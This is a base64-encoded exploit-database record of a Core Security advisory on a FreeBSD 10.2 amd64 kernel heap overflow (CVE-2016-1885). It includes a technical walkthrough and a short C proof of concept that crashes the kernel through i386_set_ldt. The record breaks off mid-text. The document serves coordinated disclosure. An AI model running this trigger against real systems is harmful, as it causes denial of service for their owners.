{
    "source": "exploit-database", 
    "exploit": "LyoNCg0KMS4gQWR2aXNvcnkgSW5mb3JtYXRpb24NCg0KVGl0bGU6IEZyZWVCU0QgS2VybmVsIGFtZDY0X3NldF9sZHQgSGVhcCBPdmVyZmxvdw0KQWR2aXNvcnkgSUQ6IENPUkUtMjAxNi0wMDA1DQpBZHZpc29yeSBVUkw6IGh0dHA6Ly93d3cuY29yZXNlY3VyaXR5LmNvbS9jb250ZW50L2ZyZWVic2Qta2VybmVsLWFtZDY0X3NldF9sZHQtaGVhcC1vdmVyZmxvdw0KRGF0ZSBwdWJsaXNoZWQ6IDIwMTYtMDMtMTYNCkRhdGUgb2YgbGFzdCB1cGRhdGU6IDIwMTYtMDMtMTQNClZlbmRvcnMgY29udGFjdGVkOiBGcmVlQlNEDQpSZWxlYXNlIG1vZGU6IENvb3JkaW5hdGVkIHJlbGVhc2UNCg0KMi4gVnVsbmVyYWJpbGl0eSBJbmZvcm1hdGlvbg0KDQpDbGFzczogVW5zaWduZWQgdG8gU2lnbmVkIENvbnZlcnNpb24gRXJyb3IgW0NXRS0xOTZdDQpJbXBhY3Q6IERlbmlhbCBvZiBzZXJ2aWNlDQpSZW1vdGVseSBFeHBsb2l0YWJsZTogTm8NCkxvY2FsbHkgRXhwbG9pdGFibGU6IFllcw0KQ1ZFIE5hbWU6IENWRS0yMDE2LTE4ODUNCg0KIA0KDQozLiBWdWxuZXJhYmlsaXR5IERlc2NyaXB0aW9uDQoNCkZyZWVCU0QgaXMgYW4gYWR2YW5jZWQgY29tcHV0ZXIgb3BlcmF0aW5nIHN5c3RlbSB1c2VkIHRvIHBvd2VyIG1vZGVybiBzZXJ2ZXJzLCBkZXNrdG9wcyBhbmQgZW1iZWRkZWQgcGxhdGZvcm1zLiBBIGxhcmdlIGNvbW11bml0eSBoYXMgY29udGludWFsbHkgZGV2ZWxvcGVkIGl0IGZvciBtb3JlIHRoYW4gdGhpcnR5IHllYXJzLiBJdHMgYWR2YW5jZWQgbmV0d29ya2luZywgc2VjdXJpdHkgYW5kIHN0b3JhZ2UgZmVhdHVyZXMgaGF2ZSBtYWRlIEZyZWVCU0QgdGhlIHBsYXRmb3JtIG9mIGNob2ljZSBmb3IgbWFueSBvZiB0aGUgYnVzaWVzdCB3ZWIgc2l0ZXMgYW5kIG1vc3QgcGVydmFzaXZlIGVtYmVkZGVkIG5ldHdvcmtpbmcgYW5kIHN0b3JhZ2UgZGV2aWNlcy4NCg0KQW4gaW50ZWdlciBzaWduZWRuZXNzIGVycm9yIGhhcyBiZWVuIGZvdW5kIGluIHRoZSBhbWQ2NF9zZXRfbGR0KCkgZnVuY3Rpb24gaW4gdGhlIEZyZWVCU0Qga2VybmVsIGNvZGUgKGRlZmluZWQgaW4gdGhlIC9zeXMvYW1kNjQvYW1kNjQvc3lzX21hY2hkZXAuYyBmaWxlKSwgd2hpY2ggaW1wbGVtZW50cyB0aGUgaTM4Nl9zZXRfbGR0IHN5c3RlbSBjYWxsIG9uIHRoZSBhbWQ2NCB2ZXJzaW9uIG9mIHRoZSBPUy4gVGhpcyBpbnRlZ2VyIHNpZ25lZG5lc3MgaXNzdWUgdWx0aW1hdGVseSBsZWFkcyB0byBhIGhlYXAgb3ZlcmZsb3cgaW4gdGhlIGtlcm5lbCwgYWxsb3dpbmcgbG9jYWwgdW5wcml2aWxlZ2VkIGF0dGFja2VycyB0byBjcmFzaCB0aGUgc3lzdGVtLg0KDQo0LiBWdWxuZXJhYmxlIHBhY2thZ2VzDQoNCkZyZWVCU0QgMTAuMiBhbWQ2NC4NCk90aGVyIGFtZDY0IHZlcnNpb25zIG1heSBiZSBhZmZlY3RlZCB0b28gYnV0IHRoZXkgd2VyZSBubyBjaGVja2VkLg0KNS4gTm9uLXZ1bG5lcmFibGUgcGFja2FnZXMNCg0KRnJlZUJTRCAxMC4yLVJFTEVORy4NCjYuIFZlbmRvciBJbmZvcm1hdGlvbiwgU29sdXRpb25zIGFuZCBXb3JrYXJvdW5kcw0KDQpUaGUgRnJlZUJTRCB0ZWFtIGhhcyByZWxlYXNlZCBwYXRjaGVzIGZvciB0aGUgcmVwb3J0ZWQgdnVsbmVyYWJpbGl0aWVzLiBZb3Ugc2hvdWxkIHVwZ3JhZGUgdG8gRnJlZUJTRCAxMC4yLVJFTEVORy4NCg0KNy4gQ3JlZGl0cw0KDQpUaGlzIHZ1bG5lcmFiaWxpdHkgd2FzIGRpc2NvdmVyZWQgYW5kIHJlc2VhcmNoZWQgYnkgRnJhbmNpc2NvIEZhbGNvbiBmcm9tIENvcmUgRXhwbG9pdCBXcml0ZXJzIFRlYW0uIFRoZSBwdWJsaWNhdGlvbiBvZiB0aGlzIGFkdmlzb3J5IHdhcyBjb29yZGluYXRlZCBieSBKb2FxdWluIFJvZHJpZ3VleiBWYXJlbGEgZnJvbSBDb3JlIEFkdmlzb3JpZXMgVGVhbS4NCg0KIA0KDQo4LiBUZWNobmljYWwgRGVzY3JpcHRpb24gLyBQcm9vZiBvZiBDb25jZXB0IENvZGUNCg0KOC4xLiBGcmVlQlNEIGFtZDY0X3NldF9sZHQgSW50ZWdlciBTaWduZWRuZXNzIFZ1bG5lcmFiaWxpdHkNCg0KW0NWRS0yMDE2LTE4ODVdIEZyZWVCU0QgZXhwb3NlcyB0aGUgaTM4Nl9zZXRfbGR0WzFdIGFyY2hpdGVjdHVyZS1kZXBlbmRlbnQgc3lzdGVtIGNhbGwgZm9yIGl0cyBJbnRlbCBpMzg2IHZlcnNpb24uIFRoaXMgc3lzdGVtIGNhbGwgY2FuIGJlIHVzZWQgdG8gbWFuYWdlIGkzODYgcGVyLXByb2Nlc3MgTG9jYWwgRGVzY3JpcHRvciBUYWJsZSAoTERUKSBlbnRyaWVzLiBUaGUgYW1kNjQgdmVyc2lvbiBvZiBGcmVlQlNEIHN0aWxsIGV4cG9zZXMgdGhpcyBzeXN0ZW0gY2FsbCBmb3IgMzItYml0IGFwcGxpY2F0aW9ucyBydW5uaW5nIG9uIHRoZSA2NC1iaXQgdmVyc2lvbiBvZiB0aGUgT1MuDQoNCkFyY2hpdGVjdHVyZS1zcGVjaWZpYyBzeXN0ZW0gY2FsbHMgYXJlIGhhbmRsZWQgYnkgdGhlIEZyZWVCU0Qga2VybmVsIGluIHRoZSBzeXNhcmNoKCkgZnVuY3Rpb24sIHdoaWNoIGlzIGRlZmluZWQgaW4gdGhlIC9zeXMvYW1kNjQvYW1kNjQvc3lzX21hY2hkZXAuY1syXSBmaWxlOg0KDQppbnQNCnN5c2FyY2godGQsIHVhcCkNCiAgICBzdHJ1Y3QgdGhyZWFkICp0ZDsNCiAgICByZWdpc3RlciBzdHJ1Y3Qgc3lzYXJjaF9hcmdzICp1YXA7DQp7DQpbLi4uXQ0KaWYgKHVhcC0+b3AgPT0gSTM4Nl9HRVRfTERUIHx8IHVhcC0+b3AgPT0gSTM4Nl9TRVRfTERUKQ0KICAgIHJldHVybiAoc3lzYXJjaF9sZHQodGQsIHVhcCwgVUlPX1VTRVJTUEFDRSkpOw0KWy4uLl0NCiAgICAgDQpBcyB3ZSBjYW4gc2VlIGluIHRoZSBjb2RlIHNuaXBwZXQgYWJvdmUsIGlmIHRoZSBzeXN0ZW0gY2FsbCBiZWluZyBpbnZva2VkIGlzIGVpdGhlciBJMzg2X0dFVF9MRFQgb3IgSTM4Nl9TRVRfTERULCB0aGVuIHRoZSBzeXNhcmNoX2xkdCgpIGZ1bmN0aW9uIGlzIGNhbGxlZC4gVGhlIGZvbGxvd2luZyBjb2RlIGV4Y2VycHQgc2hvd3MgdGhlIHBhcnQgb2YgdGhlIHN5c2FyY2hfbGR0KCkgZnVuY3Rpb24gdGhhdCBpcyBpbiBjaGFyZ2Ugb2YgaGFuZGxpbmcgdGhlIEkzODZfU0VUX0xEVCBzeXNjYWxsOg0KDQppbnQNCnN5c2FyY2hfbGR0KHN0cnVjdCB0aHJlYWQgKnRkLCBzdHJ1Y3Qgc3lzYXJjaF9hcmdzICp1YXAsIGludCB1YXBfc3BhY2UpDQp7DQpzdHJ1Y3QgaTM4Nl9sZHRfYXJncyAqbGFyZ3MsIGxhOw0Kc3RydWN0IHVzZXJfc2VnbWVudF9kZXNjcmlwdG9yICpscDsNClsuLi5dDQpzd2l0Y2ggKHVhcC0+b3ApIHsNCiAgICBbLi4uXQ0KICAgIGNhc2UgSTM4Nl9TRVRfTERUOg0KICAgICAgICAgICAgaWYgKGxhcmdzLT5kZXNjcyAhPSBOVUxMICYmIGxhcmdzLT5udW0gPiBtYXhfbGR0X3NlZ21lbnQpDQogICAgICAgICAgICAgICAgcmV0dXJuIChFSU5WQUwpOw0KICAgICAgICAgICAgc2V0X3BjYl9mbGFncyh0ZC0+dGRfcGNiLCBQQ0JfRlVMTF9JUkVUKTsNCiAgICAgICAgICAgIGlmIChsYXJncy0+ZGVzY3MgIT0gTlVMTCkgew0KICAgICAgICAgICAgICAgIGxwID0gbWFsbG9jKGxhcmdzLT5udW0gKiBzaXplb2Yoc3RydWN0DQogICAgICAgICAgICAgICAgICAgIHVzZXJfc2VnbWVudF9kZXNjcmlwdG9yKSwgTV9URU1QLCBNX1dBSVRPSyk7DQogICAgICAgICAgICAgICAgZXJyb3IgPSBjb3B5aW4obGFyZ3MtPmRlc2NzLCBscCwgbGFyZ3MtPm51bSAqDQogICAgICAgICAgICAgICAgICAgIHNpemVvZihzdHJ1Y3QgdXNlcl9zZWdtZW50X2Rlc2NyaXB0b3IpKTsNCiAgICAgICAgICAgICAgICBpZiAoZXJyb3IgPT0gMCkNCiAgICAgICAgICAgICAgICAgICAgZXJyb3IgPSBhbWQ2NF9zZXRfbGR0KHRkLCBsYXJncywgbHApOw0KICAgICAgICAgICAgICAgIGZyZWUobHAsIE1fVEVNUCk7DQogICAgICAgICAgICB9IGVsc2Ugew0KICAgICAgICAgICAgICAgIGVycm9yID0gYW1kNjRfc2V0X2xkdCh0ZCwgbGFyZ3MsIE5VTEwpOw0KICAgICAgICAgICAgfQ0KICAgICAgICAgICAgYnJlYWs7DQogICAgIA0KVGhlIGxhcmdzIHZhcmlhYmxlIHRoYXQgY2FuIGJlIHNlZW4gdGhlcmUgaXMgYSBwb2ludGVyIHRvIGFuIGkzODZfbGR0X2FyZ3Mgc3RydWN0dXJlLCB3aGljaCBpcyBkZWZpbmVkIGFzIGZvbGxvd3MgaW4gdGhlIC9zeXMveDg2L2luY2x1ZGUvc3lzYXJjaC5oWzNdIGZpbGU6DQoNCnN0cnVjdCBpMzg2X2xkdF9hcmdzIHsNCiAgICB1bnNpZ25lZCBpbnQgc3RhcnQ7DQogICAgdW5pb24gZGVzY3JpcHRvciAqZGVzY3M7DQogICAgdW5zaWduZWQgaW50IG51bTsNCn07DQogICAgIA0KTm90ZSB0aGF0IGFsbCBvZiB0aGUgZmllbGRzIG9mIHRoZSBpMzg2X2xkdF9hcmdzIHN0cnVjdHVyZSBhcmUgZnVsbHkgdXNlci1jb250cm9sbGVkOiB0aGV5IG1hdGNoIHRoZSAzIGFyZ3VtZW50cyBzcGVjaWZpZWQgYnkgdGhlIHVzZXIgd2hlbiBpMzg2X3NldF9sZHQoKSB3YXMgY2FsbGVkIGZyb20gdXNlciBtb2RlOg0KDQppbnQgaTM4Nl9zZXRfbGR0KGludCBzdGFydF9zZWwsIHVuaW9uIGRlc2NyaXB0b3IgKmRlc2NzLCBpbnQgbnVtX3NlbHMpOw0KICAgICANCkZyb20gdGhlIHN5c2FyY2hfbGR0KCkgc25pcHBldCBhYm92ZSB3ZSBjYW4gc2VlIHRoYXQgaWYgd2UgY2FsbCBpMzg2X3NldF9sZHQoKSBmcm9tIHVzZXIgbW9kZSBzcGVjaWZ5aW5nIGEgTlVMTCBwb2ludGVyIGFzIHRoZSBzZWNvbmQgYXJndW1lbnQgKGxhcmdzLT5kZXNjcyksIHRoZW4gaXQgd2lsbCBlbmQgdXAgY2FsbGluZyB0aGUgYW1kNjRfc2V0X2xkdCgpIGZ1bmN0aW9uLCBwYXNzaW5nIHRoZSBsYXJncyB2YXJpYWJsZSBhcyB0aGUgc2Vjb25kIGFyZ3VtZW50LCBhbmQgYSBOVUxMIHBvaW50ZXIgYXMgdGhlIHRoaXJkIGFyZ3VtZW50LiBUaGlzIGlzIHRoZSBwcm90b3R5cGUgb2YgdGhlIGFtZDY0X3NldF9sZHQoKSBmdW5jdGlvbiBiZWluZyBjYWxsZWQ6DQoNCmludA0KYW1kNjRfc2V0X2xkdChzdHJ1Y3QgdGhyZWFkICp0ZCwgc3RydWN0IGkzODZfbGR0X2FyZ3MgKnVhcCwgc3RydWN0IHVzZXJfc2VnbWVudF9kZXNjcmlwdG9yICpkZXNjcyk7DQogICAgIA0KYW1kNjRfc2V0X2xkdCgpIGlzIHRoZSB2dWxuZXJhYmxlIGZ1bmN0aW9uIGhlcmUuIFNpbmNlIGl0IGlzIGJlaW5nIGNhbGxlZCB3aXRoIGl0cyB0aGlyZCBhcmd1bWVudCAodGhlIGRlc2NzIHBvaW50ZXIpIHNldCB0byBOVUxMLCB0aGUgZm9sbG93aW5nIGNvZGUgcGF0aCB3aWxsIGJlIGV4ZWN1dGVkIChyZW1lbWJlciB0aGF0IGV2ZXJ5IGZpZWxkIGluIHRoZSBpMzg2X2xkdF9hcmdzIHN0cnVjdHVyZSBwb2ludGVkIGJ5IHRoZSB1YXAgcG9pbnRlciBpcyBmdWxseSBjb250cm9sbGVkIGZyb20gdXNlciBtb2RlKToNCg0KICAgIGludA0KICAgIGFtZDY0X3NldF9sZHQodGQsIHVhcCwgZGVzY3MpDQogICAgICAgIHN0cnVjdCB0aHJlYWQgKnRkOw0KICAgICAgICBzdHJ1Y3QgaTM4Nl9sZHRfYXJncyAqdWFwOw0KICAgICAgICBzdHJ1Y3QgdXNlcl9zZWdtZW50X2Rlc2NyaXB0b3IgKmRlc2NzOw0KICAgIHsNCiAgICBbLi4uXQ0KICAgICAgICBpbnQgbGFyZ2VzdF9sZDsNCiAgICBbLi4uXQ0KNjA4ICAgICAgICBpZiAoZGVzY3MgPT0gTlVMTCkgew0KNjA5ICAgICAgICAgICAgICAgICBGcmVlIGRlc2NyaXB0b3JzIA0KNjEwICAgICAgICAgICAgICAgIGlmICh1YXAtPnN0YXJ0ID09IDAgJiYgdWFwLT5udW0gPT0gMCkNCjYxMSAgICAgICAgICAgICAgICAgICAgICAgIHVhcC0+bnVtID0gbWF4X2xkdF9zZWdtZW50Ow0KNjEyICAgICAgICAgICAgICAgIGlmICh1YXAtPm51bSA9PSAwKQ0KNjEzICAgICAgICAgICAgICAgICAgICAgICAgcmV0dXJuIChFSU5WQUwpOw0KNjE0ICAgICAgICAgICAgICAgIGlmICgocGxkdCA9IG1kcC0+bWRfbGR0KSA9PSBOVUxMIHx8DQo2MTUgICAgICAgICAgICAgICAgICAgIHVhcC0+c3RhcnQgPj0gbWF4X2xkdF9zZWdtZW50KQ0KNjE2ICAgICAgICAgICAgICAgICAgICAgICAgcmV0dXJuICgwKTsNCjYxNyAgICAgICAgICAgICAgICBsYXJnZXN0X2xkID0gdWFwLT5zdGFydCArIHVhcC0+bnVtOw0KNjE4ICAgICAgICAgICAgICAgIGlmIChsYXJnZXN0X2xkID4gbWF4X2xkdF9zZWdtZW50KQ0KNjE5ICAgICAgICAgICAgICAgICAgICAgICAgbGFyZ2VzdF9sZCA9IG1heF9sZHRfc2VnbWVudDsNCjYyMCAgICAgICAgICAgICAgICBpID0gbGFyZ2VzdF9sZCAtIHVhcC0+c3RhcnQ7DQo2MjEgICAgICAgICAgICAgICAgbXR4X2xvY2soJmR0X2xvY2spOw0KNjIyICAgICAgICAgICAgICAgIGJ6ZXJvKCYoKHN0cnVjdCB1c2VyX3NlZ21lbnRfZGVzY3JpcHRvciAqKShwbGR0LT5sZHRfYmFzZSkpDQo2MjMgICAgICAgICAgICAgICAgICAgIFt1YXAtPnN0YXJ0XSwgc2l6ZW9mKHN0cnVjdCB1c2VyX3NlZ21lbnRfZGVzY3JpcHRvcikgKiBpKTsNCjYyNCAgICAgICAgICAgICAgICBtdHhfdW5sb2NrKCZkdF9sb2NrKTsNCjYyNSAgICAgICAgICAgICAgICByZXR1cm4gKDApOw0KNjI2ICAgICAgICB9DQogICAgIA0KVGhlIHR3byBpZiBzdGF0ZW1lbnRzIGF0IGxpbmVzIDYxMCBhbmQgNjEyIHBlcmZvcm0gc29tZSBzYW5pdHkgY2hlY2tzIGFnYWluc3QgdWFwLT5zdGFydCBhbmQgdWFwLT5udW0sIHdoaWNoIGNhbiBiZSBhdm9pZGVkIGJ5IHNldHRpbmcgdWFwLT5udW0gdG8gYSB2YWx1ZSBkaWZmZXJlbnQgdGhhbiAwLiBUaGUgbmV4dCBjaGVjayBhdCBsaW5lcyA2MTQvNjE1IHdpbGwgY2F1c2UgdGhlIGZ1bmN0aW9uIHRvIGV4aXQgZWFybHkgaWYgdGhlIG1kcC0+bWRfbGR0IHBvaW50ZXIgaXMgTlVMTCwgb3IgaWYgdWFwLT5zdGFydCBpcyBncmVhdGVyIG9yIGVxdWFsIHRoYW4gbWF4X2xkdF9zZWdtZW50ICgxMDI0KS4gSGF2aW5nIG1kcC0+bWRfbGR0IGhvbGRpbmcgYSBub24tTlVMTCB2YWx1ZSBjYW4gYmUgYWNoaWV2ZWQgYnkgYWRkaW5nIGFuIGluaXRpYWwgZW50cnkgdG8gdGhlIHByb2Nlc3MgTERUIGJlZm9yZSB0cmlnZ2VyaW5nIHRoZSBidWcsIGxpa2UgdGhpczoNCg0KICAgIHN0cnVjdCBzZWdtZW50X2Rlc2NyaXB0b3IgZGVzYyA9IHswLCAwLCBTRFRfTUVNUlcsIFNFTF9VUEwsIDEsIDAsIDAsIDEsIDAgLDB9OyANCiAgICBpMzg2X3NldF9sZHQoTERUX0FVVE9fQUxMT0MsICh1bmlvbiBkZXNjcmlwdG9yICopICZkZXNjLCAxKTsNCiAgICAgDQpBZnRlciBwYXNzaW5nIHRob3NlIGNoZWNrcyB3ZSByZWFjaCB0aGUgdnVsbmVyYWJsZSBjb2RlIGF0IGxpbmVzIDYxNy02MTk6DQoNCjYxNyAgICAgICAgICAgICAgICBsYXJnZXN0X2xkID0gdWFwLT5zdGFydCArIHVhcC0+bnVtOw0KNjE4ICAgICAgICAgICAgICAgIGlmIChsYXJnZXN0X2xkID4gbWF4X2xkdF9zZWdtZW50KQ0KNjE5ICAgICAgICAgICAgICAgICAgICAgICAgbGFyZ2VzdF9sZCA9IG1heF9sZHRfc2VnbWVudDsNCjYyMCAgICAgICAgICAgICAgICBpID0gbGFyZ2VzdF9sZCAtIHVhcC0+c3RhcnQ7DQogICAgIA0KTm90ZSB0aGF0IGxhcmdlc3RfbGQgaXMgYSBzaWduZWQgaW50IHRoYXQgd2lsbCBob2xkIHRoZSBzdW0gb2YgdWFwLT5zdGFydCArIHVhcC0+bnVtLiBUaGUgY29kZSBhdCBsaW5lcyA2MTgtNjE5IHRyaWVzIHRvIGVuc3VyZSB0aGF0IGxhcmdlc3RfbGQgaXMgbm90IGdyZWF0ZXIgdGhhbiBtYXhfbGR0X3NlZ21lbnQgKDEwMjQpOyBob3dldmVyLCBiZWluZyBsYXJnZXN0X2xkIGEgc2lnbmVkIGludGVnZXIgaG9sZGluZyBhIHZhbHVlIGZ1bGx5IGNvbnRyb2xsZWQgZnJvbSB1c2VyIG1vZGUsIGl0IHdpbGwgcGVyZm9ybSBhIHNpZ25lZCBjb21wYXJpc29uIHRoYXQgY2FuIGJlIGJ5cGFzc2VkIGJ5IHNldHRpbmcgdWFwLT5udW0gdG8gYSBuZWdhdGl2ZSBudW1iZXIuDQoNClRoaXMgc2lnbmVkbmVzcyBlcnJvciB3aWxsIHVsdGltYXRlbHkgbGVhZCB0byBhIGhlYXAgb3ZlcmZsb3cgaW4gdGhlIEZyZWVCU0Qga2VybmVsIHdoZW4gdGhlIGJ6ZXJvKCkgZnVuY3Rpb24gaXMgbGF0ZXIgY2FsbGVkIHdpdGggYSBodWdlIHZhbHVlIGFzIGl0cyBsZW4gcGFyYW1ldGVyOg0KDQo2MjIgICAgICAgICAgICAgICAgYnplcm8oJigoc3RydWN0IHVzZXJfc2VnbWVudF9kZXNjcmlwdG9yICopKHBsZHQtPmxkdF9iYXNlKSkNCjYyMyAgICAgICAgICAgICAgICAgICAgW3VhcC0+c3RhcnRdLCBzaXplb2Yoc3RydWN0IHVzZXJfc2VnbWVudF9kZXNjcmlwdG9yKSAqIGkpOw0KICAgICANCjguMi4gUHJvb2Ygb2YgQ29uY2VwdA0KDQpUaGUgZm9sbG93aW5nIFByb29mLW9mLUNvbmNlcHQgY29kZSByZXByb2R1Y2VzIHRoZSB2dWxuZXJhYmlsaXR5IGluIGEgZGVmYXVsdCBGcmVlQlNEIDEwLjItUkVMRUFTRS1hbWQ2NCBpbnN0YWxsYXRpb24gcnVubmluZyBhIEdFTkVSSUMga2VybmVsOg0KDQoqLw0KDQovKiAkIGNsYW5nIGFtZDY0X3NldF9sZHQuYyAtbyBhbWQ2NF9zZXRfbGR0IC1tMzIgKi8NCg0KI2luY2x1ZGUgPHN0ZGlvLmg+DQojaW5jbHVkZSA8dW5pc3RkLmg+DQojaW5jbHVkZSA8bWFjaGluZS9zZWdtZW50cy5oPg0KI2luY2x1ZGUgPG1hY2hpbmUvc3lzYXJjaC5oPg0KI2luY2x1ZGUgPHN5c2V4aXRzLmg+DQojaW5jbHVkZSA8ZXJyLmg+DQoNCg0KaW50IG1haW4oaW50IGFyZ2MsIGNoYXIgKiphcmd2KXsNCg0KICAgIGludCByZXM7DQoNCiAgICBzdHJ1Y3Qgc2VnbWVudF9kZXNjcmlwdG9yIGRlc2MgPSB7MCwgMCwgU0RUX01FTVJXLCBTRUxfVVBMLCAxLCAwLCAwLCAxLCAwICwwfTsgDQoNCiAgICBwcmludGYoIlsrXSBBZGRpbmcgYW4gaW5pdGlhbCBlbnRyeSB0byB0aGUgcHJvY2VzcyBMRFQuLi5cbiIpOw0KICAgIHJlcyA9IGkzODZfc2V0X2xkdChMRFRfQVVUT19BTExPQywgKHVuaW9uIGRlc2NyaXB0b3IgKikgJmRlc2MsIDEpOw0KICAgIGlmIChyZXMgPCAwKXsNCiAgICAgICAgZXJyKEVYX09TRVJSLCAiaTM4Nl9zZXRfbGR0KExEVF9BVVRPX0FMTE9DKSIpOw0KICAgIH0NCiAgICBwcmludGYoInJldHVybmVkIGluZGV4OiAlZFxuIiwgcmVzKTsNCg0KICAgIHByaW50ZigiVHJpZ2dlcmluZyB0aGUgYnVnLi4uXG4iKTsNCiAgICByZXMgPSBpMzg2X3NldF9sZHQoMSwgTlVMTCwgMHg4MDAwMDAwMCk7DQp9DQogICAgIA0KLyoNCg0KOS4gUmVwb3J0IFRpbWVsaW5lDQoNCjIwMTYtMDMtMDI6IENvcmUgU2VjdXJpdHkgc2VudCBhbiBpbml0aWFsIG5vdGlmaWNhdGlvbiB0byBGcmVlQlNELg0KMjAxNi0wMy0wMjogRnJlZUJTRCBjb25maXJtZWQgcmVjZXB0aW9uIG9mIG91ciBlbWFpbCBhbmQgcmVxdWVzdGVkIHdlIHNlbnQgdGhlbSBhIGRyYWZ0IHZlcnNpb24gb2YgdGhlIGFkdmlzb3J5Lg0KMjAxNi0wMy0wMjogQ29yZSBTZWN1cml0eSBzZW50IEZyZWVCU0QgYSBkcmFmdCB2ZXJzaW9uIG9mIHRoZSBhZHZpc29yeS4gV2UgcmVxdWVzdGVkIHRoZW0gdG8gbGV0IHVzIGtub3cgb25jZSB0aGV5IGZpbmlzaGVkIHJldmlld2luZyB0aGUgYWR2aXNvcnkgaW4gb3JkZXIgdG8gY29vcmRpbmF0ZSBhIHB1YmxpY2F0aW9uIGRhdGUuDQoyMDE2LTAzLTExOiBDb3JlIFNlY3VyaXR5IGFza2VkIEZyZWVCU0QgaWYgdGhleSB3ZXJlIGFibGUgdG8gcmV2aWV3IGFuZCB2ZXJpZnkgdGhlIHJlcG9ydGVkIGlzc3VlLiBXZSBhZGRpdGlvbmFsbHkgcmVxdWVzdGVkIGFuIGVzdGltYXRlZCBkYXRlIGZvciByZWxlYXNpbmcgdGhlIGZpeC91cGRhdGUuDQoyMDE2LTAzLTExOiBGcmVlQlNEIGluZm9ybWVkIHVzIHRoZXkgd2VyZSBnb2luZyB0byByZWxlYXNlIHRoZSB1cGRhdGUgaW4gdGhlIG1pZGRsZSBvZiB0aGUgZm9sbG93aW5nIHdlZWsuDQoyMDE2LTAzLTExOiBDb3JlIFNlY3VyaXR5IGFza2VkIEZyZWVCU0QgaWYgdGhleSBoYWQgdGhlIHNwZWNpZmljIGRhdGUgYW5kIHRpbWUgdGhleSB3ZXJlIGdvaW5nIHRvIHJlbGVhc2UgdGhlIHVwZGF0ZS4gV2UgYWRkaXRpb25hbGx5IHJlcXVlc3RlZCBhIENWRSBpZGVudGlmaWVyIGZvciB0aGUgdnVsbmVyYWJpbGl0eSBjb25zaWRlcmluZyB0aGV5IGFyZSByZWdpc3RlcmVkIGFzIGEgQ05BLg0KMjAxNi0wMy0xMTogRnJlZUJTRCBpbmZvcm1lZCB1cyB0aGV5IHdvdWxkIHByb2JhYmx5IHJlbGVhc2UgaXQgb24gV2VkbmVzZGF5IDE2dGggb2YgTWFyY2ggYW5kIHRoYXQgdGhleSBhc3NpZ25lZCB0aGUgQ1ZFLTIwMTYtMTg4NSBJRC4NCjIwMTYtMDMtMTY6IEFkdmlzb3J5IENPUkUtMjAxNi0wMDA1IHB1Ymxpc2hlZC4NCjEwLiBSZWZlcmVuY2VzDQoNClsxXSBodHRwczovL3d3dy5mcmVlYnNkLm9yZy9jZ2kvbWFuLmNnaT9xdWVyeT1pMzg2X3NldF9sZHQmc2VrdGlvbj0yJm1hbnBhdGg9RnJlZUJTRCs4LjItUkVMRUFTRQ0KWzJdIGh0dHBzOi8vc3Zud2ViLmZyZWVic2Qub3JnL2Jhc2UvcmVsZWFzZS8xMC4yLjAvc3lzL2FtZDY0L2FtZDY0L3N5c19tYWNoZGVwLmM/dmlldz1tYXJrdXANClszXSBodHRwczovL3N2bndlYi5mcmVlYnNkLm9yZy9iYXNlL3JlbGVhc2UvMTAuMi4wL3N5cy94ODYvaW5jbHVkZS9zeXNhcmNoLmg/dmlldz1tYXJrdXANCg0KMTEuIEFib3V0IENvcmVMYWJzDQoNCkNvcmVMYWJzLCB0aGUgcmVzZWFyY2ggY2VudGVyIG9mIENvcmUgU2VjdXJpdHksIGlzIGNoYXJnZWQgd2l0aCBhbnRpY2lwYXRpbmcgdGhlIGZ1dHVyZSBuZWVkcyBhbmQgcmVxdWlyZW1lbnRzIGZvciBpbmZvcm1hdGlvbiBzZWN1cml0eSB0ZWNobm9sb2dpZXMuIFdlIGNvbmR1Y3Qgb3VyIHJlc2VhcmNoIGluIHNldmVyYWwgaW1wb3J0YW50IGFyZWFzIG9mIGNvbXB1dGVyIHNlY3VyaXR5IGluY2x1ZGluZyBzeXN0ZW0gdnVsbmVyYWJpbGl0aWVzLCBjeWJlciBhdHRhY2sgcGxhbm5pbmcgYW5kIHNpbXVsYXRpb24sIHNvdXJjZSBjb2RlIGF1ZGl0aW5nLCBhbmQgY3J5cHRvZ3JhcGh5LiBPdXIgcmVzdWx0cyBpbmNsdWRlIHByb2JsZW0gZm9ybWFsaXphdGlvbiwgaWRlbnRpZmljYXRpb24gb2YgdnVsbmVyYWJpbGl0aWVzLCBub3ZlbCBzb2x1dGlvbnMgYW5kIHByb3RvdHlwZXMgZm9yIG5ldyB0ZWNobm9sb2dpZXMuIENvcmVMYWJzIHJlZ3VsYXJseSBwdWJsaXNoZXMgc2VjdXJpdHkgYWR2aXNvcmllcywgdGVjaG5pY2FsIHBhcGVycywgcHJvamVjdCBpbmZvcm1hdGlvbiBhbmQgc2hhcmVkIHNvZnR3YXJlIHRvb2xzIGZvciBwdWJsaWMgdXNlIGF0OiBodHRwOi8vY29yZWxhYnMuY29yZXNlY3VyaXR5LmNvbS4NCg0KMTIuIEFib3V0IENvcmUgU2VjdXJpdHkgVGVjaG5vbG9naWVzDQoNCkNvcmUgU2VjdXJpdHkgVGVjaG5vbG9naWVzIGVuYWJsZXMgb3JnYW5pemF0aW9ucyB0byBnZXQgYWhlYWQgb2YgdGhyZWF0cyB3aXRoIHNlY3VyaXR5IHRlc3QgYW5kIG1lYXN1cmVtZW50IHNvbHV0aW9ucyB0aGF0IGNvbnRpbnVvdXNseSBpZGVudGlmeSBhbmQgZGVtb25zdHJhdGUgcmVhbC13b3JsZCBleHBvc3VyZXMgdG8gdGhlaXIgbW9zdCBjcml0aWNhbCBhc3NldHMuIE91ciBjdXN0b21lcnMgY2FuIGdhaW4gcmVhbCB2aXNpYmlsaXR5IGludG8gdGhlaXIgc2VjdXJpdHkgc3RhbmRpbmcsIHJlYWwgdmFsaWRhdGlvbiBvZiB0aGVpciBzZWN1cml0eSBjb250cm9scywgYW5kIHJlYWwgbWV0cmljcyB0byBtb3JlIGVmZmVjdGl2ZWx5IHNlY3VyZSB0aGVpciBvcmdhbml6YXRpb25zLg0KDQpDb3JlIFNlY3VyaXR5J3Mgc29mdHdhcmUgc29sdXRpb25zIGJ1aWxkIG9uIG92ZXIgYSBkZWNhZGUgb2YgdHJ1c3RlZCByZXNlYXJjaCBhbmQgbGVhZGluZy1lZGdlIHRocmVhdCBleHBlcnRpc2UgZnJvbSB0aGUgY29tcGFueSdzIFNlY3VyaXR5IENvbnN1bHRpbmcgU2VydmljZXMsIENvcmVMYWJzIGFuZCBFbmdpbmVlcmluZyBncm91cHMuIENvcmUgU2VjdXJpdHkgVGVjaG5vbG9naWVzIGNhbiBiZSByZWFjaGVkIGF0ICsxICg2MTcpIDM5OS02OTgwIG9yIG9uIHRoZSBX